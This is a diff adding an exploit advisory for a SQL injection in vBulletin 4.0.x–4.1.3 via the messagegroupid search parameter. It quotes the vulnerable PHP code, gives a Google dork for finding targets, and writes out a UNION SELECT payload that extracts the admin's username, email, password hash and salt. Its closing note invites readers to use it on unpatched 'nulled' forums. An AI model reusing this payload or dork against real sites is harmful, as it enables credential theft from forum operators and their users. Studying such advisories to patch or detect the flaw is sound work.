@@ -1,0 +1,87 @@
+# Exploit Title: Vbulletin 4.0.x => 4.1.3 (messagegroupid) SQL injection Vulnerability 0-day
+# Google Dork: intitle: powered by Vbulletin 4
+# Date: 20/07/2011
+# Author: FB1H2S	
+# Software Link: [[url]http://www.vbulletin.com/][/url]
+# Version: [4.x.x]
+# Tested on: [relevant os]
+# CVE : [[url]http://members.vbulletin.com/][/url]
+
+######################################################################################################
+Vulnerability:
+######################################################################################################
+
+Vbulletin 4.x.x => 4.1.3 suffers from an SQL injection Vulnerability in parameter "&messagegroupid" due to improper input validation.
+
+#####################################################################################################
+Vulnerable Code:
+#####################################################################################################
+
+File:    /vbforum/search/type/socialgroupmessage.php
+Line No: 388
+Paramater : messagegroupid
+
+
+
+		
+		if ($registry->GPC_exists['messagegroupid'] AND count($registry->GPC['messagegroupid']) > 0)
+
+		{
+
+			$value = $registry->GPC['messagegroupid'];
+
+			if (!is_array($value))
+
+			{
+
+				$value = array($value);
+
+			}
+
+
+
+			if (!(in_array(' ',$value) OR in_array('',$value)))
+
+			{
+
+				if ($rst = $vbulletin->db->query_read("
+
+					SELECT socialgroup.name
+
+					FROM " . TABLE_PREFIX."socialgroup AS socialgroup
+
+--->					WHERE socialgroup.groupid IN (" . implode(', ', $value) .")")
+
+				
+			}
+
+
+
+############################################################################################
+Exploitation:
+############################################################################################
+Post data on: -->search.php?search_type=1
+	      --> Search Single Content Type
+
+Keywords :   Valid Group Message
+
+Search Type : Group Messages 
+
+Search in Group : Valid Group Id
+
+&messagegroupid[0]=3 ) UNION SELECT concat(username,0x3a,email,0x3a,password,0x3a,salt) FROM user WHERE userid=1#
+
+##########################################################################################
+More Details:
+##########################################################################################
+Http://www.Garage4Hackers.com
+http://www.garage4hackers.com/showthread.php?1177-Vbulletin-4.0.x-gt-4.1.3-(messagegroupid)-SQL-injection-Vulnerability-0-day
+
+
+###########################################################################################
+Note:
+###########################################################################################
+
+Funny part was that, a similar bug was found in the same module, search query two months back. Any way Vbulletin has released a patch as it was reported to them by altex, hence
+customers are safe except those lowsy Admins. And this bug is for people to play with the many Nulled VB sites out there. " Say No to Piracy Disclosure ".
+
